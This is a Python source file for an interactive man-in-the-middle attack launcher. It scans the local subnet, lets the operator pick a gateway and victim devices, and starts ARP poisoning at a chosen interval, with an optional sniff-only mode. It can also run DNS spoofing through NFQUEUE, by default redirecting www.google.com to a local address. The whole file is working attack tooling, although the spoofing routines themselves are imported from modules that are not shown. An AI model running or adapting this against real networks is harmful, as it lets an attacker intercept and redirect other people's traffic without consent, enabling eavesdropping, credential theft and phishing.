import os
import threading
import signal
import sys

from network_utils import scan_network, get_attacker_ip, get_attacker_mac
from attacks.arp_spoof import start_arp_spoofing
from attacks.dns_spoof import init_logging, setup_nfqueue, start_dns_spoofer, teardown_nfqueue
from scapy.arch import get_if_list

def print_banner():
    """Display the application banner."""
    print('=' * 50)
    print('         MITM Attack Launcher (ARP / DNS)        ')
    print('=' * 50)

def print_menu():
    """Show the top-level menu options."""
    print('1. Start ARP spoofing only')
    print('2. Start ARP + DNS spoofing')
    print('0. Exit\n')

def choose_from_list(prompt, items):
    """
    Present a numbered list of items and prompt the user to choose one.
    Returns the selected item.
    """
    print('\n' + prompt)
    for index, item in enumerate(items):
        print('  {}. {}'.format(index, item))
    while True:
        choice = raw_input('Enter your choice: ').strip() if False else input('Enter your choice: ').strip()
        try:
            idx = int(choice)
            if 0 <= idx < len(items):
                return items[idx]
        except ValueError:
            pass
        print('Invalid input; please try again.')

def choose_interface():
    """Let the user select a network interface from the system list."""
    interfaces = get_if_list()
    return choose_from_list('Available network interfaces:', interfaces)

def choose_gateway(hosts):
    """
    Let the user choose the network gateway (router) from discovered hosts.
    Hosts is a list of (ip, mac) tuples.
    """
    print('\nSelect the gateway (router):')
    for index, (ip, mac) in enumerate(hosts):
        print('  {}. {} ({})'.format(index, ip, mac))
    while True:
        choice = input('Gateway index: ').strip()
        try:
            idx = int(choice)
            if 0 <= idx < len(hosts):
                return hosts[idx]
        except ValueError:
            pass
        print('Invalid index; please try again.')

def choose_victims(hosts, gateway):
    """
    Display discovered hosts (excluding the gateway) and let the user pick victims.
    Allows comma-separated indexes or 'a' for all.
    """
    print('\nDetected devices (excluding gateway):')
    selectable = [(i, ip, mac) for i, (ip, mac) in enumerate(hosts) if (ip, mac) != gateway]
    for idx, ip, mac in selectable:
        print('  {}. {} ({})'.format(idx, ip, mac))

    print('\nSelect victim indexes (comma-separated) or \'a\' for all:')
    while True:
        choice = input('Your choice: ').strip().lower()
        if choice == 'a':
            return [(ip, mac) for _, ip, mac in selectable]
        try:
            picks = [int(x.strip()) for x in choice.split(',')]
            victims = []
            for p in picks:
                for idx, ip, mac in selectable:
                    if p == idx:
                        victims.append((ip, mac))
            if victims:
                return victims
        except ValueError:
            pass
        print('Invalid selection; please try again.')

def choose_arp_settings(enable_dns):
    """
    Ask the user for ARP spoofing mode (if DNS is disabled) and frequency.
    Returns (anonymous_mode: bool, interval_seconds: int).
    """
    anonymous = False
    if not enable_dns:
        print('\n[*] ARP spoof type:')
        print('  1. Normal MITM (modify traffic)')
        print('  2. Anonymous SMITM (sniff only)')
        while True:
            choice = input('Your choice [1-2]: ').strip()
            if choice == '1':
                break
            if choice == '2':
                anonymous = True
                break
            print('Please enter 1 or 2.')

    print('\n[*] ARP send interval:')
    print('  1. Fast (1s)')
    print('  2. Normal (2s)')
    print('  3. Slow (10s)')
    print('  4. Custom')
    while True:
        choice = input('Your choice [1-4]: ').strip()
        if choice == '1':
            return anonymous, 1
        if choice == '2':
            return anonymous, 2
        if choice == '3':
            return anonymous, 10
        if choice == '4':
            val = input('Custom interval (seconds): ').strip()
            try:
                secs = int(val)
                if secs > 0:
                    return anonymous, secs
            except ValueError:
                pass
            print('Enter a positive integer.')
        else:
            print('Please choose 1, 2, 3, or 4.')

def launch_attack(enable_dns):
    """
    Coordinates ARP (and optionally DNS) spoofing based on user choices.
    """
    iface        = choose_interface()
    attacker_ip  = get_attacker_ip(iface)
    attacker_mac = get_attacker_mac(iface)
    subnet       = '.'.join(attacker_ip.split('.')[:-1]) + '.0/24'

    print('\n[*] Scanning network on {}...'.format(subnet))
    hosts = scan_network(subnet, iface=iface)
    if len(hosts) < 2:
        print('[-] Not enough devices found; exiting.')
        sys.exit(1)

    gateway_ip, gateway_mac = choose_gateway(hosts)
    victims = choose_victims(hosts, (gateway_ip, gateway_mac))
    if not victims:
        print('[-] No victims selected; exiting.')
        sys.exit(1)

    anonymous, interval = choose_arp_settings(enable_dns)

    # Default DNS spoof map placeholder
    default_map = {'www.google.com': '192.168.56.102'}
    domain_ip_map = {}

    if enable_dns:
        print('\nDefault DNS spoof: www.google.com -> 192.168.56.102')
        print('Enter domains to spoof; leave blank at first prompt to keep default.')

        # Prompt for the first domain
        first_dom = input('Domain to spoof (blank for default): ').strip().lower()
        if not first_dom:
            # User chose default
            domain_ip_map = default_map.copy()
        else:
            # User provided at least one domain -- discard default entirely
            ip = input('Fake IP for {}: '.format(first_dom)).strip()
            if ip:
                domain_ip_map[first_dom] = ip

            # Additional domains
            while True:
                dom = input('Another domain (blank to finish): ').strip().lower()
                if not dom:
                    break
                ip = input('Fake IP for {}: '.format(dom)).strip()
                if ip:
                    domain_ip_map[dom] = ip

    stop_event = threading.Event()
    print('\n[*] Starting ARP spoofing on {} victim(s)...'.format(len(victims)))
    arp_thread = threading.Thread(
        target=start_arp_spoofing,
        args=(victims, gateway_ip, gateway_mac, attacker_mac, iface, stop_event, interval, anonymous),
        daemon=True
    )
    arp_thread.start()

    try:
        if enable_dns:
            init_logging()
            print('\n[*] Enabling DNS spoofing (NFQUEUE)...')
            setup_nfqueue(queue_num=1)
            start_dns_spoofer(domain_ip_map, iface, queue_num=1)
        else:
            print('\n[*] ARP-only mode. Press Ctrl+C to stop.')
            while True:
                signal.pause()
    except KeyboardInterrupt:
        print('\n[!] Interrupted by user; cleaning up...')
    finally:
        print('\n[*] Restoring network settings...')
        stop_event.set()
        arp_thread.join()
        if enable_dns:
            teardown_nfqueue(queue_num=1)
        print('[+] Cleanup complete. Goodbye.')

def main():
    """Entry point: show banner and handle user menu."""
    print_banner()
    while True:
        print_menu()
        try:
            choice = input('Select option [0-2]: ').strip()
        except (KeyboardInterrupt, EOFError):
            choice = '0'
        if choice == '1':
            launch_attack(enable_dns=False)
        elif choice == '2':
            launch_attack(enable_dns=True)
        elif choice == '0':
            print('Exiting.')
            sys.exit(0)
        else:
            print('Invalid choice; please enter 0, 1 or 2.')

if __name__ == '__main__':
    main()
